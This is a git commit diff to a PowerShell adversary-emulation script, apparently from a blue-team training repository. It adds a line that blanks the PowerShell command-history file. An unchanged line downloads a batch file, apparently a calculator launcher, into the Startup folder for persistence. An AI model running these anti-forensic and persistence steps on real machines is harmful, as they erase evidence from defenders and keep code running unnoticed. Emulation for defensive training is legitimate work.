e0fec81df769659b8f47040a76e821c5a4a04f54
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-09-26 15:11:21 -0400

    Update establishPersistence.ps1

--- Adversary Emulation/establishPersistence.ps1
+++ Adversary Emulation/establishPersistence.ps1
@@ -1,3 +1,6 @@
+# Corrupt PowerShell History Text File
+echo "" > C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 # StartUp Folder Persistence
 Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
 
